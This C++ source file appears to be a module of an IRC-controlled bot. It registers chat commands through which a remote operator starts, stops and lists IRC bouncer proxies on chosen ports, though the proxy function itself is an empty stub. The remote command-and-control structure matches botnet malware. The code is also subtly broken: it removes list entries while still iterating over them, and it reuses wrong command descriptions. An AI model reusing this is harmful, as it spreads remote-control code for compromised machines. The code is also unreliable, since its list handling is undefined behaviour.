#include "main.h"
#include "mainctrl.h"
#include "bnc.h"

CBNC::CBNC() { lbStart.clear(); lsStart.clear(); luStart.clear(); llStart.clear(); }

void CBNC::Init() {
	REGCMD(m_cmdStart,		"bnc.start",	"starts a bnc server", false, this);
	REGCMD(m_cmdStop,		"bnc.stop",		"stops a running bnc", false, this);
	REGCMD(m_cmdStopAll,	"bnc.stopall",	"stops a running bnc", false, this);
	REGCMD(m_cmdList,		"bnc.listall",	"stops a running bnc", false, this);
}

int CBNC::StartBNC(unsigned long iServerNum, int iPort)
{
	return 0;
}

int CBNC::DeleteLoginById(unsigned long iServerNum, char *szUsername)
{
	list<bnc_login*>::iterator i; for(i=llStart.begin(); i!=llStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum && !(*i)->sUsername.Compare(szUsername))
		{	llStart.remove((*i)); return 0; }
	}
	return 0;
}
int CBNC::DeleteLoginById(unsigned long iServerNum, bool bAll)
{
	list<bnc_login*>::iterator i; for(i=llStart.begin(); i!=llStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum) llStart.remove((*i)); }
	return 0;
}

int CBNC::DeleteUserById(unsigned long iServerNum, char *szUsername)
{
	list<bnc_user*>::iterator i; for(i=luStart.begin(); i!=luStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum && !(*i)->sUsername.Compare(szUsername))
		{	luStart.remove((*i)); return 0; }
	}
	return 0;
}
int CBNC::DeleteUserById(unsigned long iServerNum, bool bAll)
{
	list<bnc_user*>::iterator i; for(i=luStart.begin(); i!=luStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum) luStart.remove((*i)); }
	return 0;
}

int CBNC::DeleteServerById(unsigned long iServerNum, char *szServer)
{
	list<bnc_server*>::iterator i; for(i=lsStart.begin(); i!=lsStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum && !(*i)->sServer.Compare(szServer))
		{	lsStart.remove((*i)); return 0; }
	}
	return 0;
}
int CBNC::DeleteServerById(unsigned long iServerNum, bool bAll)
{
	list<bnc_server*>::iterator i; for(i=lsStart.begin(); i!=lsStart.end(); ++i)
	{	if((*i)->iServerNum == iServerNum) lsStart.remove((*i)); }
	return 0;
}

bool CBNC::HandleCommand(CMessage *pMsg) {
	if(!pMsg->sCmd.Compare("bnc.start"))
	{
		int iPort = atoi(pMsg->sChatString.Token(1, " ").CStr());
		if(iPort < 1 || iPort > 65535) return false;

		iServerNum++;
		bnc *pBNC = new bnc;
		pBNC->iServerNum = iServerNum; pBNC->iPort = iPort;
		lbStart.push_back(pBNC);

		StartBNC(iServerNum, iPort);
		
		CString sReply;
		sReply.Format("Started BNC on port %s.", pMsg->sChatString.Token(1, " ").CStr());
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
	}

	else if(!pMsg->sCmd.Compare("bnc.stop"))
	{
		int iPort = atoi(pMsg->sChatString.Token(1, " ").CStr());
		if(iPort < 1 || iPort > 65535) return false;

		list<bnc*>::iterator i; for(i=lbStart.begin(); i!=lbStart.end(); ++i)
		{	if((*i)->iPort == atoi(pMsg->sChatString.Token(1, " ").CStr())) {
				DeleteLoginById((*i)->iServerNum, true);
				DeleteUserById((*i)->iServerNum, true);
				DeleteServerById((*i)->iServerNum, true);
				lbStart.remove((*i));

				CString sReply;
				sReply.Format("Stopped BNC on port %s.", pMsg->sChatString.Token(1, " ").CStr());
				g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());

				return true;
			}
		}
	}

	else if(!pMsg->sCmd.Compare("bnc.stopall"))
	{
		lbStart.clear(); lsStart.clear(); luStart.clear(); llStart.clear();

		CString sReply;
		sReply.Assign("Stopped all running BNCs.");
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
	}

	else if(!pMsg->sCmd.Compare("bnc.listall"))
	{
		g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "-[ bnc list ]-", pMsg->sReplyTo.Str());
		list<bnc*>::iterator ic; int iCount=0;
		for(ic=lbStart.begin(); ic!=lbStart.end(); ++ic)
		{	iCount++; CString sReply; sReply.Format("%d. / \"Port %d.\"", \
				iCount, (*ic)->iPort);
			g_pMainCtrl->m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
			Sleep(1500); }
	}

	return false;
}
